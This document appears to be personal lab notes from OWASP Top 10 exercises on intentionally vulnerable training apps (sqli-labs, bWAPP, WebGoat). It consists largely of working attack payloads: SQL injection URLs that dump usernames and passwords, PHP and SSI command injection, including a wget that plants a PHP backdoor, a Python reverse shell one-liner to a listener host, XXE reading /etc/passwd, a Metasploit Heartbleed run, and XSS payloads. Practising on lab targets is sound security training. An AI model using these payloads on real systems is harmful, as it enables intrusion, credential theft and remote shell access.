root@kali-2017:~# service mysql start
root@kali-2017:~# mysql -u root -p
MariaDB [(none)]> use mysql;

GRANT ALL PRIVILEGES ON *.* TO 'alex'@'localhost' IDENTIFIED BY 'password';
root@kali-2017:~# service mysql restart

root@kali-2017:/var/www/html/sqli-labs-php7/sql-connections# cd 
update db-creds.inc
m
service mysql restart
root@kali-2017:/var/www/html/sqli-labs-php7/sql-connections# service apache2 start

root@kali-2017:/etc/mysql/mariadb.conf.d# vi 50-server.cnf 

uncomment:
general_log_file        = /var/log/mysql/mysql.log
general_log             = 1

root@kali-2017:/etc/mysql/mariadb.conf.d# service mysql restart

OWASP A1 Pt3:

True id=1 cannot display our disired output:
localhost/sqli-labs-php7/Less-1/?id=1' UNION SELECT 1,2,3--+

http://localhost/sqli-labs-php7/Less-1/?id=9999%27%20UNION%20SELECT%201,version(),database()--+

http://localhost/sqli-labs-php7/Less-1/?id=9999%27%20UNION%20SELECT%201,user(),@@datadir--+

Find out the schema table:
localhost/sqli-labs-php7/Less-1/?id=-1' UNION SELECT * FROM users WHERE id='-1' union SELECT 1,group_concat(DISTINCT table_schema SEPARATOR ', '),
3 FROM information_schema.tables WHERE table_schema!= 'mysql' AND table_schema != 'information_schema' --+

Find out the table details:
localhost/sqli-labs-php7/Less-1/?id=-1' UNION SELECT * FROM users WHERE id='-1' union SELECT 1,group_concat(DISTINCT column_name SEPARATOR ', '),
3 FROM information_schema.columns WHERE table_schema='security' --+

Show all username and password:
localhost/sqli-labs-php7/Less-1/?id=-1' union select 1,group_concat(username SEPARATOR ', '), group_concat(password SEPARATOR ', ') from users --+

OWASP A1 Pt4:
Less-8 Blind SQL-->Check Ture(You are in):
http://localhost/sqli-labs-php7/Less-8/?id=1' AND 1=1 --+

MariaDB [mysql]> use security;
MariaDB [security]> select substr(database(),1,1);
MariaDB [security]> select ascii(substr(database(),1,1));
Use Burp:
id=1' AND (ascii(substr((select database()),1,1))) = ascii --+
http://localhost/sqli-labs-php7/Less-8/?id=1%27%20AND%20(ascii(substr((select%20database()),1,1)))%20=%20ascii%20--+
Sent to GET to Intruder, clear §; payload on §ascii§, payload type:Numbers 97-121,Step 1, 
Then(115):
GET /sqli-labs-php7/Less-8/?id=1%27%20AND%20(ascii(substr((select%20database()),1,1)))%20=%20115%20--+

Less-9 Blind-Time based
MariaDB [security]> select if ((select ascii(substr((select database()),1,1))) = 115, sleep(5), null);

id=1' AND if((select ascii(substr((select database()),1,1))) = 115, sleep(5), null) --+
http://localhost/sqli-labs-php7/Less-9/?id=1%27%20AND%20if((select%20ascii(substr((select%20database()),1,1)))%20=%20115,%20sleep(5),%20null)%20--+
Like before:
localhost/sqli-labs-php7/Less-9/?id=1' AND if((select ascii(substr((select database()),1,1))) = ascii, sleep(5), null) --+


BeeBox

OWASP A1 Injection Lab Pt5

http://192.168.1.135/bWAPP/phpi.php?message=phpinfo()
http://192.168.1.135/bWAPP/phpi.php?message=1;system('cat /proc/version');
http://192.168.1.135/bWAPP/phpi.php?message=test;system('grep -A 5 1001 /etc/passwd');
http://192.168.1.135/bWAPP/phpi.php?message=fuck;system('hostname');
http://192.168.1.135/bWAPP/phpi.php?message=fuck;system('whoami');

Server-Side Includes (SSI) Injection
Check:
<!--#exec cmd="hostname" -->
<!--#exec cmd="pwd" -->
<!--#exec cmd="wget http://192.168.1.134/php-backdoor.txt -O /var/www/bWAPP/shellz.php" -->

python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("192.168.1.134",4444));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'

OWASP A2

tcpdump -nnttttAi eth0

OWASP A6

nmap -p8443 --script ssl-poodle.nse 192.168.1.135

msf > use auxiliary/scanner/ssl/openssl_heartbleed 
msf auxiliary(scanner/ssl/openssl_heartbleed) > set RPORT 8443
RPORT => 8443
msf auxiliary(scanner/ssl/openssl_heartbleed) > set RHOSTS 192.168.1.135
RHOSTS => 192.168.1.135
msf auxiliary(scanner/ssl/openssl_heartbleed) > set VERBOSE true
VERBOSE => true
msf auxiliary(scanner/ssl/openssl_heartbleed) > run

OWASP A4

java -jar webgoat-server-8.0.0.M14.jar --server.port=9090

<?xml version="1.0" standalone="yes" ?>
<!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///" >]>
<comment> 
<text>Fuck&xxe;</text>
</comment>

https://192.168.1.135:8443/bWAPP/xxe-1.php
Add:
<?xml version="1.0" encoding="utf-8"?>
<!DOCTYPE foo [<!ENTITY bWAPP SYSTEM "file:///etc/passwd">]>
<reset><login>&bWAPP;</login><secret>Any bugs?</secret></reset>

OWASP A7 (XSS)

http://localhost:9090/WebGoat/CrossSiteScripting/attack5a?QTY1=1&QTY2=1&QTY3=1&QTY4=1&field1=%3Cscript%3Ealert(%27my+javascript+here%27)%3C%2Fscript%3E&field2=111
DOM XSS
http://localhost:9090/WebGoat/start.mvc#test/<script>alert('DOM XSS works')<%2Fscript>
By Brup:
http://localhost:9090/WebGoat/start.mvc#test/<script>webgoat.customjs.phoneHome()<%2Fscript>

XSS - Reflected (GET)
<script>alert('Alex')</script>

XSS - Reflected (JSON) 
}]}';</script><script>alert('Alex')</script>
<svg onload=alert(1)>
<img src=# onerror=alert(1)>

XSS - Reflected (Back Button)
';alert('Alex');'

XSS - Reflected (Custom Header)
bWAPP: <script>alert('Reflected Alex XSS')</script>

XSS - Reflected (Referer)/ XSS - Stored (User-Agent)
User-Agent:/Referer: <script>alert('Reflected Alex XSS')</script>

SQLiteManager XSS
/usr/share/exploitdb/exploits/php/webapps/33154.txt
http://192.168.1.135/sqlite/main.php?redirect=<script>alert('SQLite=vulnerable')</script>

